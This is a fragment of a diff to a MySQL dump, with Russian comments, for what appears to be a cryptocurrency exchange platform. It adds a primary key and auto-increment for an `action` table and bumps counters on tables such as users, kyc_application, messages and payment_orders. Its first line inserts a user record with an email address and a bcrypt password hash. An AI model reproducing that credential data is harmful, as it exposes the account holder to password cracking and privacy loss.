+(89, '11lff11011011109@omeie.com', '11lff11011011109@omeie.com', 59197683, '$2y$10$hleJHI4rAXZN0SYnIDwf5ehTgEmbWnD486W.9f.60/EW.hS3X.eXu', 0, '2023-12-12 01:20:07', 0, 0, '{\"image_url\": \"/assets/users_avatars/standard_avatar.png\"}', 'user', NULL, NULL, NULL, NULL, 0, NULL, 'NULL', '2023-12-12');
 
 -- --------------------------------------------------------
 
@@ -662,6 +755,12 @@ CREATE TABLE `withdraw` (
 --
 -- Индексы сохранённых таблиц
 --
+
+--
+-- Индексы таблицы `action`
+--
+ALTER TABLE `action`
+  ADD PRIMARY KEY (`id`);
 
 --
 -- Индексы таблицы `api_keys`
@@ -787,6 +886,12 @@ ALTER TABLE `withdraw`
 --
 
 --
+-- AUTO_INCREMENT для таблицы `action`
+--
+ALTER TABLE `action`
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
+
+--
 -- AUTO_INCREMENT для таблицы `api_keys`
 --
 ALTER TABLE `api_keys`
@@ -796,19 +901,19 @@ ALTER TABLE `api_keys`
 -- AUTO_INCREMENT для таблицы `bindings_users`
 --
 ALTER TABLE `bindings_users`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;
 
 --
 -- AUTO_INCREMENT для таблицы `codes`
 --
 ALTER TABLE `codes`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=26;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=54;
 
 --
 -- AUTO_INCREMENT для таблицы `coins`
 --
 ALTER TABLE `coins`
-  MODIFY `id_coin` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=283;
+  MODIFY `id_coin` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=285;
 
 --
 -- AUTO_INCREMENT для таблицы `deposits`
@@ -826,13 +931,13 @@ ALTER TABLE `domains`
 -- AUTO_INCREMENT для таблицы `kyc_application`
 --
 ALTER TABLE `kyc_application`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;
 
 --
 -- AUTO_INCREMENT для таблицы `messages`
 --
 ALTER TABLE `messages`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=49;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=80;
 
 --
 -- AUTO_INCREMENT для таблицы `networks_coin`
@@ -856,13 +961,13 @@ ALTER TABLE `p2p_users`
 -- AUTO_INCREMENT для таблицы `payment_orders`
 --
 ALTER TABLE `payment_orders`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(20) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=95307951;
 
 --
 -- AUTO_INCREMENT для таблицы `promo_codes`
 --
 ALTER TABLE `promo_codes`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;
 
 --
 -- AUTO_INCREMENT для таблицы `settings`
@@ -874,13 +979,13 @@ ALTER TABLE `settings`
 -- AUTO_INCREMENT для таблицы `staking_orders`
 --
 ALTER TABLE `staking_orders`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
 
 --
 -- AUTO_INCREMENT для таблицы `users`
 --
 ALTER TABLE `users`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=66;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=90;
 
 --
 -- AUTO_INCREMENT для таблицы `withdraw`
